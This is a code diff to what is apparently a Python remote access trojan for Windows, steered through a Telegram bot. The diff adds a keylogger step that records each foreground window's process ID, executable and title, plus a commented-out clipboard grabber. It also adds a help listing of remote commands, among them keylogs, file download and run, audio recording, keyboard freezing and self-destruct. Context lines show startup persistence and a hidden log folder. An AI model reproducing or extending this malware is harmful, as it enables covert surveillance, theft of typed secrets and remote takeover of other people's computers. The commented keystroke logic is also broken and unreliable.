@@ -8,6 +8,7 @@ from winshell import startup 							# persistence
 from tendo import singleton								# this makes the application exit if there's another instance already running
 from win32com.client import Dispatch					# used for WScript.Shell
 from time import strftime, sleep					
+import win32clipboard                                   # Register clipboard    
 import base64											# /encrypt_all
 import datetime											# /schedule
 import time
@@ -47,7 +48,8 @@ if not os.path.exists(hide_folder):
 destroy = False
 keyboardFrozen = False
 mouseFrozen = False
-user = os.environ.get("USERNAME")	# Windows username to append keylogs.txt
+curr_window = None
+user = os.environ.get("USERNAME")	# Windows username to append keylogs
 schedule = {}
 log_file = hide_folder + '\\.user'
 with open(log_file, "a") as writing:
@@ -65,6 +67,7 @@ def encode(file):
 	t = open(file, "w+")
 	t.write(encodedBytes)
 	t.close()
+	
 def decode(file):
 	f = open(file)
 	data = f.read()
@@ -77,12 +80,14 @@ def decode(file):
 	t = open(file, "w+")
 	t.write(decodedBytes)
 	t.close()
+	
 def runStackedSchedule(everyNSeconds):
 	for k in schedule.keys():
 		if k < datetime.datetime.now():
 			handle(schedule[k])
 			del schedule[k]
 	threading.Timer(everyNSeconds, runStackedSchedule).start()
+	
 def internalIP():
 	internal_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	internal_ip.connect(('google.com', 0))
@@ -90,8 +95,33 @@ def internalIP():
 	
 def checkchat_id(chat_id):
 	return len(known_ids) == 0 or str(chat_id) in known_ids
+
+def get_curr_window():
+		user32 = ctypes.windll.user32
+		kernel32 = ctypes.windll.kernel32
+		hwnd = user32.GetForegroundWindow()
+		pid = ctypes.c_ulong(0)
+		user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
+		process_id = "%d" % pid.value
+		executable = ctypes.create_string_buffer("\x00" * 512)
+		h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
+		ctypes.windll.psapi.GetModuleBaseNameA(h_process, None, ctypes.byref(executable), 512)
+		window_title = ctypes.create_string_buffer("\x00" * 512)
+		length = user32.GetWindowTextA(hwnd, ctypes.byref(window_title), 512)
+		pid_info = "\n[ PID %s - %s - %s ]" % (process_id, executable.value, window_title.value)
+		kernel32.CloseHandle(hwnd)
+		kernel32.CloseHandle(h_process)
+		return pid_info
 	
 def pressed_chars(event):
+	data = None
+	global curr_window
+	if event.WindowName != curr_window:
+		curr_window = event.WindowName
+		fp = open(log_file, 'a')
+		data = get_curr_window()
+		fp.write(data + "\n")
+		fp.close()
 	if event and type(event.Ascii) == int:
 		f = open(log_file,"a")
 		if len(event.GetKey()) > 1:
@@ -105,6 +135,46 @@ def pressed_chars(event):
 		f.write(tofile)
 		f.close()
 	return not keyboardFrozen
+
+	# if event.Ascii > 32 and event.Ascii < 127:
+		# fp = open(log_file, 'a')
+		# data = chr(event.Ascii)
+		# fp.write(data)
+		# fp.close()
+	# else:
+		# while event.Key == "Lcontrol" or "Rcontrol" and event.Key == "A":
+			# fp = open(log_file, 'a')
+			# fp.write("[SELECT-ALL]")
+			# fp.close()
+			# break
+		# while event.Key == "Lcontrol" or "Rcontrol" and event.Key == "C":
+			# fp = open(log_file, 'a')
+			# fp.write("[COPY]")
+			# fp.close()
+			# break
+		# while event.Key == "Lcontrol" or "Rcontrol" and event.Key == "V":
+			# win32clipboard.OpenClipboard()
+			# try:
+				# data = "\n[PASTE] - %s\n" % win32clipboard.GetClipboardData()
+			# except TypeError:
+				# pass
+			# win32clipboard.CloseClipboard()
+			# fp = open(log_file, 'a')
+			# fp.write(data)
+			# fp.close()
+			# break
+		# if event.Key == "Lshift" or "Rshift" or "Return" or "Back":
+			# fp = open(log_file, 'a')
+			# data = "[%s]" % event.Key
+			# fp.write(data)
+			# fp.close()
+		# else:
+			# fp = open(log_file, 'a')
+			# data = "\n[%s]\n" % event.Key
+			# fp.write(data)
+			# fp.close()
+		# return not keyboardFrozen
+	
 def split_string(n, st):
 	lst = ['']
 	for i in str(st):
@@ -114,6 +184,7 @@ def split_string(n, st):
 		else:
 			lst += [i]
 	return lst
+	
 def send_safe_message(bot, chat_id, message):
 	while(True):
 		try:
@@ -397,6 +468,29 @@ def handle(msg):
 						msg = {'text' : command, 'chat' : { 'id' : chat_id }}
 						handle(msg)
 			elif command == '/help':
+				# functionalities dictionary: command:arguments
+				functionalities = { '/arp' : '', \
+						'/capture_pc' : '', \
+						'/cd':'<target_dir>', \
+						'/delete':'<target_file>', \
+						'/download':'<target_file>', \
+						'/decode_all':'', \
+						'/encode_all':'', \
+						'/freeze_keyboard':'', \
+						'/freeze_mouse':'', \
+						'/hear':'[time in seconds, default=5s]', \
+						'/ip_info':'', \
+						'/keylogs':'', \
+						'/ls':'[target_folder]', \
+						'/msg_box':'<text>', \
+						'/pc_info':'', \
+						'/play':'<youtube_videoId>', \
+						'/proxy':'', \
+						'/pwd':'', \
+						'/run':'<target_file>', \
+						'/self_destruct':'', \
+						'/tasklist':'', \
+						'/to':'<target_computer>, [other_target_computer]'}
 				response = "\n".join(command + ' ' + description for command,description in sorted(functionalities.items()))
 			else: # redirect to /help
 				msg = {'text' : '/help', 'chat' : { 'id' : chat_id }}
